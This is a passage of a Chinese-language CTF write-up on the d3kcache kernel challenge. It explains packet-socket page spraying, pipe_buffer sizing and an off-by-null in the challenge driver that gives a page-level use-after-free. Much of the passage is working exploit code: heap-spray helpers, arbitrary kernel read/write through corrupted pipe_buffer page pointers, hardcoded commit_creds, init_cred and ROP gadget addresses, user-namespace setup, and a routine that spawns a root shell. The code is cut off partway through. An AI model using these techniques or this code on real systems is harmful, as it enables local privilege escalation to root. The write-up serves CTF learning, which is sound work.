&#123;\t\tbitmap_free(rx_owner_map);\t\tfree_pg_vec(pg_vec, order, req-&gt;tp_block_nr);\t&#125;out:\treturn err;&#125;\n\n可以看到这里的order是由req-&gt;tp_block_size确定的，而且req是用户可以控制的，所以这里的申请的page的order也是可控的。并且需要注意的是在if (closing || atomic_read(&amp;po-&gt;mapped) == 0)这个条件分支中，会交换rb-&gt;pg_vec中的内容和当前函数中变量pg_vec中的内容，所以在最后不会执行到free_pg_vec函数。\n释放这里的释放流程很简单：packet_release=&gt;packet_set_ring=&gt;free_pg_vec\nstatic void free_pg_vec(struct pgv *pg_vec, unsigned int order,\t\t\tunsigned int len)&#123;\tint i;\tfor (i = 0; i &lt; len; i++) &#123;\t\tif (likely(pg_vec[i].buffer)) &#123;\t\t\tif (is_vmalloc_addr(pg_vec[i].buffer))\t\t\t\tvfree(pg_vec[i].buffer);\t\t\telse\t\t\t\tfree_pages((unsigned long)pg_vec[i].buffer,\t\t\t\t\t   order);\t\t\tpg_vec[i].buffer = NULL;\t\t&#125;\t&#125;\tkfree(pg_vec);&#125;\n\n可以看到就是将里面的内容给释放掉。\nstatic int packet_release(struct socket *sock)&#123;\tstruct sock *sk = sock-&gt;sk;\tstruct packet_sock *po;\tstruct packet_fanout *f;\tstruct net *net;\tunion tpacket_req_u req_u;\tif (!sk)\t\treturn 0;\t... ...\tlock_sock(sk);\tif (po-&gt;rx_ring.pg_vec) &#123;\t\tmemset(&amp;req_u, 0, sizeof(req_u));\t\tpacket_set_ring(sk, &amp;req_u, 1, 0);\t&#125;\tif (po-&gt;tx_ring.pg_vec) &#123;\t\tmemset(&amp;req_u, 0, sizeof(req_u));\t\tpacket_set_ring(sk, &amp;req_u, 1, 1);\t&#125;  ... ...&#125;\n\n很容易注意到的是都调用的packet_set_ring函数，而在packet_release函数中所给的参数中第三个参数为1。\nstatic int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,\t\tint closing, int tx_ring)\n\n对比函数声明可以看出来这个参数就代表要关闭了，并且在执行这个函数之前memset(&amp;req_u, 0, sizeof(req_u));执行了这样一条语句，也就导致req中的所有内容都为\\x00，也就不进入分配的分支中去了。不过依旧会进入到进行各种swap的分支，因为在分配时走过一次，所以这次最后会调用到free_pg_vec函数了，而这个函数在这里说了就是释放掉所有页面。\n总结当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 setsockopt() 便相当于获取到了一块近乎物理连续的内存（为什么是”近乎连续“是因为大量的 setsockopt() 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）。\n所以这里的使用流程就是，先使用上述办法进行堆喷。\n\n  释放一部分order为3的page，接着使用victim object进行申请这些页面\n  释放一个页面，使用vuln object申请这一页面\n  释放一部分order为3的page，再次让victim object申请到\n\n\n最终实现上图这样的效果。\npipe_buffer在以往的文章中出现了很多次的pipe_buffer，但是可惜的是使用的方式过于简单。比如，只是简单的利用他的ops指针进行泄漏或者覆盖它控制执行流，再就是Dirty Pipe中的利用。可恨的是我在做题的过程中并没有想到使用Dirty Pipe，即便是当时我已经对pipe_buffer所在的堆块上有绝对的权限了。所以这里就不再只是对其ops的利用了，后面主要就是破坏其page指针了。\npipe_buffer分配过程#define PIPE_DEF_BUFFERS\t16struct pipe_inode_info *alloc_pipe_info(void)&#123;\tstruct pipe_inode_info *pipe;\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\tstruct user_struct *user = get_current_user();\tunsigned long user_bufs;\tunsigned int max_size = READ_ONCE(pipe_max_size);\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\tif (pipe == NULL)\t\tgoto out_free_uid;\tif (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))\t\tpipe_bufs = max_size &gt;&gt; PAGE_SHIFT;\tuser_bufs = account_pipe_buffers(user, 0, pipe_bufs);\tif (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;\t\tuser_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);\t\tpipe_bufs = PIPE_MIN_DEF_BUFFERS;\t&#125;\tif (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())\t\tgoto out_revert_acct;\tpipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\t\t\t     GFP_KERNEL_ACCOUNT);\tif (pipe-&gt;bufs) &#123;\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = 1;\t\tpipe-&gt;max_usage = pipe_bufs;\t\tpipe-&gt;ring_size = pipe_bufs;\t\tpipe-&gt;nr_accounted = pipe_bufs;\t\tpipe-&gt;user = user;\t\tmutex_init(&amp;pipe-&gt;mutex);\t\treturn pipe;\t&#125;out_revert_acct:\t(void) account_pipe_buffers(user, pipe_bufs, 0);\tkfree(pipe);out_free_uid:\tfree_uid(user);\treturn NULL;&#125;\n\n可以看到在后面申请pipe-&gt;bufs使用了kcalloc函数，而这个函数的第一个参数分配的数量，第二参数就是每一个单位的大小。其实在其内部中也是会将这两个参数相乘起来的，而这两个值其实都是已知的，第一个为16，第二个为40，那么他们的结果就是640。\nstruct kmem_cache *kmalloc_slab(size_t size, gfp_t flags)&#123;\tunsigned int index;\tif (size &lt;= 192) &#123;\t\tif (!size)\t\t\treturn ZERO_SIZE_PTR;\t\tindex = size_index[size_index_elem(size)];\t&#125; else &#123;\t\tif (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))\t\t\treturn NULL;\t\tindex = fls(size - 1);\t&#125;\treturn kmalloc_caches[kmalloc_type(flags)][index];&#125;\n\n在kcalloc函数中会到这里进行选择cache\nconst struct kmalloc_info_struct kmalloc_info[] __initconst = &#123;\tINIT_KMALLOC_INFO(0, 0),\tINIT_KMALLOC_INFO(96, 96),\tINIT_KMALLOC_INFO(192, 192),\tINIT_KMALLOC_INFO(8, 8),\tINIT_KMALLOC_INFO(16, 16),\tINIT_KMALLOC_INFO(32, 32),\tINIT_KMALLOC_INFO(64, 64),\tINIT_KMALLOC_INFO(128, 128),\tINIT_KMALLOC_INFO(256, 256),\tINIT_KMALLOC_INFO(512, 512),\tINIT_KMALLOC_INFO(1024, 1k),\tINIT_KMALLOC_INFO(2048, 2k),\tINIT_KMALLOC_INFO(4096, 4k),\tINIT_KMALLOC_INFO(8192, 8k),\tINIT_KMALLOC_INFO(16384, 16k),\tINIT_KMALLOC_INFO(32768, 32k),\tINIT_KMALLOC_INFO(65536, 64k),\tINIT_KMALLOC_INFO(131072, 128k),\tINIT_KMALLOC_INFO(262144, 256k),\tINIT_KMALLOC_INFO(524288, 512k),\tINIT_KMALLOC_INFO(1048576, 1M),\tINIT_KMALLOC_INFO(2097152, 2M)&#125;;\n\n很明显这里选择的是kmalloc-cg-1k。然而，kmalloc-cg-1k来自于order为2的页面。但是根据前面的意思我们需要order为3的页面出来的，所以如果这里申请的页面order为2的话成功率会大打折扣。\npipe_buffer修改分配大小pipe给人的惊喜是不断的，pipe可以提供了fcntl(F_SETPIPE_SZ)调用去修改每个pipe中pipe_buffer的数量。\nstatic long pipe_set_size(struct pipe_inode_info *pipe, unsigned long arg)&#123;\tunsigned long user_bufs;\tunsigned int nr_slots, size;\tlong ret = 0;#ifdef CONFIG_WATCH_QUEUE\tif (pipe-&gt;watch_queue)\t\treturn -EBUSY;#endif    size = round_pipe_size(arg);\tnr_slots = size &gt;&gt; PAGE_SHIFT;\tif (!nr_slots)\t\treturn -EINVAL;\t... ...\tret = pipe_resize_ring(pipe, nr_slots);\tif (ret &lt; 0)\t\tgoto out_revert_acct;\tpipe-&gt;max_usage = nr_slots;\tpipe-&gt;nr_accounted = nr_slots;\treturn pipe-&gt;max_usage * PAGE_SIZE;out_revert_acct:\t(void) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);\treturn ret;&#125;\n\n这个函数中会调用到pipe_resize_ring函数，这里会根据size得到nr_slots，而在调用pipe_resize_ring函数时nr_slots为第二个参数。\nint pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)&#123;\tstruct pipe_buffer *bufs;\tunsigned int head, tail, mask, n;\tbufs = kcalloc(nr_slots, sizeof(*bufs),\t\t       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);\tif (unlikely(!bufs))\t\treturn -ENOMEM;\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);\tmask = pipe-&gt;ring_size - 1;\thead = pipe-&gt;head;\ttail = pipe-&gt;tail;\tn = pipe_occupancy(head, tail);\tif (nr_slots &lt; n) &#123;\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\tkfree(bufs);\t\treturn -EBUSY;\t&#125;\t... ...\treturn 0;&#125;\n\n可以注意到的是在这个函数开头的位置就调用了kcalloc函数，而这个函数的第一个参数就是我们可以通过fcntl调用修改的。如果，nr_slots的值为64，那么申请的size即为0xa00则会申请kmalloc-4k，此时order为3，可以大大提高成功率。\nstatic inline int calculate_order(unsigned int size)&#123;\tunsigned int order;\tunsigned int min_objects;\tunsigned int max_objects;\tunsigned int nr_cpus;\t/*\t * Attempt to find best configuration for a slab. This\t * works by first attempting to generate a layout with\t * the best configuration and backing off gradually.\t *\t * First we increase the acceptable waste in a slab. Then\t * we reduce the minimum objects required in a slab.\t */\tmin_objects = slub_min_objects;\tif (!min_objects) &#123;\t\t/*\t\t * Some architectures will only update present cpus when\t\t * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But\t\t * we also don&#x27;t want to use nr_cpu_ids always, as on some other\t\t * architectures, there can be many possible cpus, but never\t\t * onlined. Here we compromise between trying to avoid too high\t\t * order on systems that appear larger than they are, and too\t\t * low order on systems that appear smaller than they are.\t\t */\t\tnr_cpus = num_present_cpus();\t\tif (nr_cpus &lt;= 1)\t\t\tnr_cpus = nr_cpu_ids;\t\tmin_objects = 4 * (fls(nr_cpus) + 1);\t&#125;\tmax_objects = order_objects(slub_max_order, size);\tmin_objects = min(min_objects, max_objects);\t... ...&#125;\n\n可能各位会疑惑为什么kmalloc-4k的order为3，这里重新看calculate_order函数，可以看到在对min_objects变量赋值的最后一个操作就是选取最小的。\nstatic inline unsigned int order_objects(unsigned int order, unsigned int size)&#123;\treturn ((unsigned int)PAGE_SIZE &lt;&lt; order) / size;&#125;\n\n而order_objects函数内部是这样的，并且此时slub_max_order的值为3，所以当size为4k时也就是0x1000时max_objects的值为0x8，所以按照这样计算的话后续求得的order为3。\nd3kcache前面铺垫了这么多终于到了题目了，如果有了前面提到的所有基础理论知识再来看这道题的话，依旧无法很轻松的完成。\n题目在开了基本的保护之外还开启了很多的编译选项中的保护\nCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;CONFIG_SLUB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=y\n\n这些基本的都是开启了的，除此之外还开启了一个Control Flow Integrity保护。\nCONFIG_CFI_CLANG=y\n\n而这个保护会检测ops是否合法，这个检测十分严格，需要ops的值与一个固定的内容进行异或，结果不为0就直接触发kernel panic。也就是因为当时不清楚这个内容导致我调了半天去劫持pipe_buffer的ops指针。\n驱动分析__int64 init_module()&#123;  unsigned int v0; // ebx  printk(&amp;unk_96B);  major_num = _register_chrdev(0LL, 0LL, 256LL, &quot;d3kcache&quot;, &amp;d3kcache_fo);  if ( major_num &gt;= 0 )  &#123;    module_class = _class_create(&amp;_this_module, &quot;d3kcache&quot;, &amp;d3kcache_module_init___key);    if ( (unsigned __int64)module_class &lt; 0xFFFFFFFFFFFFF001LL )    &#123;      printk(&amp;unk_A0D);      v0 = 0;      module_device = device_create(module_class, 0LL, (unsigned int)(major_num &lt;&lt; 20), 0LL, &quot;d3kcache&quot;);      if ( (unsigned __int64)module_device &lt; 0xFFFFFFFFFFFFF001LL )      &#123;        printk(&amp;unk_A66);        spin = 0;        kcache_jar = kmem_cache_create_usercopy(&quot;kcache_jar&quot;, 0x800LL, 0LL, 67379200LL, 0LL, 2048LL, 0LL);        memset(kcache_list, 0, 0x100uLL);      &#125;      else      &#123;        class_destroy(module_class);        _unregister_chrdev((unsigned int)major_num, 0LL, 256LL, &quot;d3kcache&quot;);        printk(&amp;unk_A3B);        return (unsigned int)module_device;      &#125;    &#125;    else    &#123;      _unregister_chrdev((unsigned int)major_num, 0LL, 256LL, &quot;d3kcache&quot;);      printk(&amp;unk_9DE);      return (unsigned int)module_class;    &#125;  &#125;  else  &#123;    printk(&amp;unk_9AD);    return (unsigned int)major_num;  &#125;  return v0;&#125;\n\n首先看初始化模块部分，可以看到里面调用了前面提到的kmem_cache_create_usercopy函数，并且参数中size指定为0x800，那么根据前面所以到的，这里的order即为3。\n__int64 __fastcall d3kcache_ioctl(__int64 a1, int a2, __int64 a3)&#123;  __int64 v4; // rax  __int64 v5; // rbx  int v7; // ecx  __int64 v8; // r14  __int64 v9; // r15  __int64 v10; // r12  int v11; // ecx  __int64 v12; // rbx  __int64 v13; // r14  __int64 v14; // r15  __int64 v15; // rax  __int64 v16; // r15  unsigned int v17; // r13d  __int64 v18; // r14  __int64 v19; // r12  __int64 v20; // r14  unsigned __int64 v21; // rbx  __int64 v22; // rax  __int64 v23; // r12  unsigned __int64 v24; // rbx  void *v25; // rdi  unsigned int v26; // [rsp-48h] [rbp-48h] BYREF  unsigned int v27; // [rsp-44h] [rbp-44h]  __int64 v28; // [rsp-40h] [rbp-40h]  unsigned __int64 v29; // [rsp-38h] [rbp-38h]  v29 = __readgsqword(0x28u);  raw_spin_lock(&amp;spin);  v4 = copy_from_user(&amp;v26, a3, 16LL);  v5 = -1LL;  if ( v4 )    goto LABEL_2;  if ( a2 &gt; 0x80F )  &#123;    if ( a2 == 0x810 )    &#123;      if ( v26 &gt; 0xFuLL || !qword_17D8[2 * v26] )      &#123;        v25 = &amp;unk_882;        goto LABEL_46;      &#125;      kmem_cache_free(kcache_jar);      v20 = (int)v26;      if ( (unsigned __int64)(int)v26 &gt; 0xF )      &#123;        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);        v21 = (int)v26;        qword_17D8[2 * v20] = 0LL;        if ( v21 &gt;= 0x10 )          _ubsan_handle_out_of_bounds(&amp;off_12C0, (unsigned int)v21);      &#125;      else      &#123;        qword_17D8[2 * (int)v26] = 0LL;        v21 = (unsigned int)v20;      &#125;      kcache_list[4 * v21] = 0;      v5 = 0LL;    &#125;    else    &#123;      if ( a2 != 6425 )        goto LABEL_42;      if ( v26 &gt; 0xFuLL || !qword_17D8[2 * v26] )      &#123;        v25 = &amp;unk_85D;        goto LABEL_46;      &#125;      v11 = v27;      if ( v27 &gt; kcache_list[4 * v26] )        v11 = kcache_list[4 * v26];      if ( v11 &lt; 0 )        BUG();      v12 = (unsigned int)v11;      v13 = qword_17D8[2 * v26];      v14 = v28;      _check_object_size(v13, (unsigned int)v11, 1LL);      v5 = -(__int64)(copy_to_user(v14, v13, v12) != 0);    &#125;  &#125;  else  &#123;    if ( a2 != 0x114 )    &#123;      if ( a2 == 0x514 )      &#123;        if ( v26 &lt;= 0xFuLL &amp;&amp; qword_17D8[2 * v26] )        &#123;          v7 = v27;          if ( v27 &gt; 0x800 || v27 + kcache_list[4 * v26] &gt;= 0x800 )            v7 = 2048 - kcache_list[4 * v26];          if ( v7 &lt; 0 )            BUG();          v8 = qword_17D8[2 * v26] + (unsigned int)kcache_list[4 * v26];          v9 = (unsigned int)v7;          v10 = v28;          _check_object_size(v8, (unsigned int)v7, 0LL);          if ( !copy_from_user(v8, v10, v9) )          &#123;            *(_BYTE *)(v8 + v9) = 0;            v5 = 0LL;          &#125;          goto LABEL_2;        &#125;        v25 = &amp;unk_837;LABEL_46:        printk(v25);        goto LABEL_2;      &#125;LABEL_42:      v25 = &amp;unk_8AA;      goto LABEL_46;    &#125;    if ( v26 &gt;= 0x10uLL )    &#123;      v25 = &amp;unk_782;      goto LABEL_46;    &#125;    if ( qword_17D8[2 * v26] )    &#123;      v25 = &amp;unk_7F6;      goto LABEL_46;    &#125;    v15 = kmem_cache_alloc(kcache_jar, 0xDC0LL);    if ( !v15 )    &#123;      v25 = &amp;unk_81A;      goto LABEL_46;    &#125;    v16 = v15;    v17 = v27;    v18 = 2048LL;    if ( v27 &lt; 0x800 )      v18 = v27;    v19 = v28;    _check_object_size(v15, v18, 0LL);    if ( copy_from_user(v16, v19, v18) )    &#123;      kmem_cache_free(kcache_jar);    &#125;    else    &#123;      v22 = 0x7FFLL;      if ( v17 &lt; 0x7FF )        v22 = v17;      *(_BYTE *)(v16 + v22) = 0;      v23 = (int)v26;      if ( (unsigned __int64)(int)v26 &gt; 0xF )      &#123;        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);        v24 = (int)v26;        qword_17D8[2 * v23] = v16;        if ( v24 &gt;= 0x10 )          _ubsan_handle_out_of_bounds(&amp;off_1280, (unsigned int)v24);      &#125;      else      &#123;        qword_17D8[2 * (int)v26] = v16;        v24 = (unsigned int)v23;      &#125;      kcache_list[4 * v24] = v18;      v5 = 0LL;    &#125;  &#125;LABEL_2:  raw_spin_unlock(&amp;spin);  return v5;&#125;\n\n再就是ioctl函数，逆向分析过后可以发现这里分为四个分支，也就是增删改查，这里漏洞发生在增和改的部分，存在很明显的off by null。除此之外再无其他漏洞。\n预期利用分析根据前面所述的内容，目前已经达到了vuln slab page和victim slab page相邻的情况了，而经过后续的分析我们可以得知前面两个页面分别对应的是题目中创建的slab page和pipe_buffer所在的slab_page。答案已经呼之欲出了，如果我们使用题目的off by null漏洞，我们就可以让pipe_buffer-&gt;page指针指向其他pipe_buffer所指向的位置，而如果我们控制其中一个pipe_buffer并释放掉page，就形成了页级的UAF。不过page的大小只有0x40所以成功率只有1/4，因为以0x00结尾时off by null无法影响其指向。\n\n\n目前我们已经形成了页级的UAF，那么如果我们在已经free的page处申请pipe_buffer会发生什么呢？\n\n结果就是会形成如上图一样的结构，此时我们可以通过最左边的pipe_buffer读取到它page指向的新的pipe_buffer中的内容，并且此时我们不光可以读取还可以对page的内容进行写，可以让最右边的两个pipe_buffer的page指针又指向同一个，从而形成下面这种情况：\n根据上面的思路，我们还可以将最右边的page给free掉又一次造成了页级的UAF，但是这一次不同的是我们通过第一次的泄漏可以知道最右边page的地址的。有趣的来了，在最右边造成了页级的UAF之后我们继续申请pipe_buffer放在最右边的page中，并且控制里面pipe_buffer的page指针指向自身，最终形成下面这种情况：\n\n因为是一个页级UAF的缘故，我们还可以使用中间的pipe去修改下面的其他pipe_buffer，所以在最右侧，我们总共可以控制到三个pipe_buffer。而这三个pipe_buffer的作用分别是：\n\n  第一个管道通过page指针内存空间的任意地址读写\n  第二个管道用于修改第三个管道的内容，让第三个管道可以指向第一个管道\n  第三个管道用于修改第一个管道和第二个管道，修改第一个管道的page到指定位置，修改第二个管道的指向为第三个管道\n\n这样三个管道实现互相循环修改，即可实现整个内核内存空间几乎无任何限制的任意地址读写。\n既然已经可以任意地址无限制读写了，那么提权的方式也就多种多样了。当然，这里需要提前注意到的是pipe_buffer中的page指针终归是要指向到page结构体的。而内核中vmemmap区域中存放着所有的page结构体，所以首要找到vmemmap区域即可。\n那么第一种方法就是通过修改task_struct中的cred指针为init_cred的地址。\n第二种方法就是通过写内核栈实现ROP的办法，首先需要泄漏出栈地址，在task_struct结构体中存在一个stack成员，顾名思义其中存放的就是栈地址，不过这里存放的是虚拟地址。不过我们如果要往栈空间中写内容的话需要知道他对应的物理地址对应的page结构地址。好在我们可以通过页表获取到对应的物理地址，在task_struct结构体中的mm成员中存放的是mm_struct结构体的地址，而我们可以通过mm_struct结构体中的pgd成员获取到页表的地址。最后通过也变转化即可获取到栈地址对应的page结构体地址了，进而往栈中写入准备的rop即可。\n第三种方法就是通过USMA进行利用也就是用户态映射攻击，原理则是修改内核代码段的内容，不过直接通过直接映射区去修改的话会因为没有写入权限造成kernel panic。但是，改写内核代码段的本质是向其所对应的物理页面写入数据，所以既然我们可以对页表进行读写，那么我们就可以直接在用户空间建立一个到内核代码段对应物理内存的映射就可以改写内核代码了。\n综上所述，可得exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define PGV_PAGE_NUM 1000#define PGV_1PAGE_SPRAY_NUM 0x20#define PGV_4PAGES_SPRAY_NUM 0x40#define PGV_4PAGES_START_IDX 0x20#define PGV_8PAGES_SPRAY_NUM 0x40#define PGV_8PAGES_START_IDX 0x60#define PACKET_VERSION 10#define PACKET_TX_RING 13#define PIPE_SPRAY_NUM 200#define SND_PIPE_BUF_SZ 96#define TRD_PIPE_BUF_SZ 192void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;struct option&#123;    unsigned int idx;    unsigned int size;    char *buf;&#125;;void create(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x114, option);&#125;void delete(unsigned int idx)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    ioctl(fd, 0x810, option);&#125;void show(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x1919, option);&#125;void edit(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x514, option);&#125;struct pgv_page_request&#123;    int idx;    int cmd;    unsigned int size;    unsigned int nr;&#125;;enum tpacket_versions&#123;    TPACKET_V1,    TPACKET_V2,    TPACKET_V3,&#125;;struct tpacket_req&#123;    unsigned int tp_block_size;    unsigned int tp_block_nr;    unsigned int tp_frame_size;    unsigned int tp_frame_nr;&#125;;int cmd_pipe_req[2], cmd_pipe_reply[2];int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)&#123;    struct tpacket_req req;    int socket_fd, version;    int ret;    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);    if (socket_fd &lt; 0)    &#123;        printf(&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\\n&quot;);        ret = socket_fd;        return ret;    &#125;    version = TPACKET_V1;    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,                     &amp;version, sizeof(version));    if (ret &lt; 0)    &#123;        printf(&quot;[x] failed at setsockopt(PACKET_VERSION)\\n&quot;);        close(socket_fd);        return ret;    &#125;    memset(&amp;req, 0, sizeof(req));    req.tp_block_size = size;    req.tp_block_nr = nr;    req.tp_frame_size = 0x1000;    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));    if (ret &lt; 0)    &#123;        printf(&quot;[x] failed at setsockopt(PACKET_TX_RING)\\n&quot;);        close(socket_fd);        return ret;    &#125;    return socket_fd;&#125;int alloc_page(int idx, unsigned int size, unsigned int nr)&#123;    struct pgv_page_request req = &#123;        .idx = idx,        .cmd = 0,        .size = size,        .nr = nr,    &#125;;    int ret;    write(cmd_pipe_req[1], &amp;req, sizeof(struct pgv_page_request));    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));    return ret;&#125;int free_page(int idx)&#123;    struct pgv_page_request req = &#123;        .idx = idx,        .cmd = 1,    &#125;;    int ret;    write(cmd_pipe_req[1], &amp;req, sizeof(req));    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));    usleep(10000);    return ret;&#125;struct page;struct pipe_inode_info;struct pipe_buf_operations;struct pipe_buffer&#123;    struct page *page;    unsigned int offset, len;    const struct pipe_buf_operations *ops;    unsigned int flags;    unsigned long private;&#125;;int pipe_fd[PIPE_SPRAY_NUM][2];struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;int self_4th_pipe_pid = -1;int self_2nd_pipe_pid = -1;int self_3rd_pipe_pid = -1;char temp_zero_buf[0x1000] = &#123;&#x27;\\0&#x27;&#125;;void arbitrary_read_by_pipe(struct page *page_to_read, void *dst)&#123;    evil_2nd_buf.offset = 0;    evil_2nd_buf.len = 0x1ff8;    evil_2nd_buf.page = page_to_read;    write(pipe_fd[self_3rd_pipe_pid][1], &amp;evil_4th_buf, sizeof(evil_4th_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_2nd_buf, sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1],          temp_zero_buf,          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));    read(pipe_fd[self_2nd_pipe_pid][0], dst, 0xfff);&#125;void arbitrary_write_by_pipe(struct page *page_to_write, void *src, size_t len)&#123;    evil_2nd_buf.page = page_to_write;    evil_2nd_buf.offset = 0;    evil_2nd_buf.len = 0;    write(pipe_fd[self_3rd_pipe_pid][1], &amp;evil_4th_buf, sizeof(evil_4th_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_2nd_buf, sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1],          temp_zero_buf,          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));    write(pipe_fd[self_2nd_pipe_pid][1], src, len);&#125;uint64_t page_offset_base;uint64_t vmemmap_base;size_t direct_map_addr_to_page_addr(size_t direct_map_addr)&#123;    size_t page_count;    page_count = ((direct_map_addr &amp; (~0xfff)) - page_offset_base) / 0x1000;    return vmemmap_base + page_count * 0x40;&#125;#define COMMIT_CREDS 0xffffffff811284e0#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90#define INIT_CRED 0xffffffff83079ee8#define POP_RDI_RET 0xffffffff810157a9#define RET 0xffffffff810157aa#define PTE_OFFSET 12#define PMD_OFFSET 21#define PUD_OFFSET 30#define PGD_OFFSET 39#define PT_ENTRY_MASK 0b111111111UL#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)#define PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)#define PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)#define PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)#define PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)#define PAGE_ATTR_NX (1UL &lt;&lt; 63)#define NS_CAPABLE_SETID 0xffffffff810fd2a0int main()&#123;    save_status();    char *buf = malloc(0x2000);    char target[16];    size_t target_addr;    strcpy(target, &quot;trytofind196082&quot;);    if (prctl(PR_SET_NAME, target, 0, 0, 0) != 0)    &#123;        errExit(&quot;cannot set name&quot;);    &#125;    fd = open(&quot;/dev/d3kcache&quot;, O_RDWR);    if (fd == -1)    &#123;        errExit(&quot;[-] faild open d3kcache!&quot;);    &#125;    pipe(cmd_pipe_req);    pipe(cmd_pipe_reply);    if (!fork())    &#123;        struct pgv_page_request req;        int socket_fd[PGV_PAGE_NUM];        int ret;        char edit[0x100];        int tmp_fd;        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);        tmp_fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);        write(tmp_fd, &quot;deny&quot;, strlen(&quot;deny&quot;));        close(tmp_fd);        tmp_fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);        snprintf(edit, 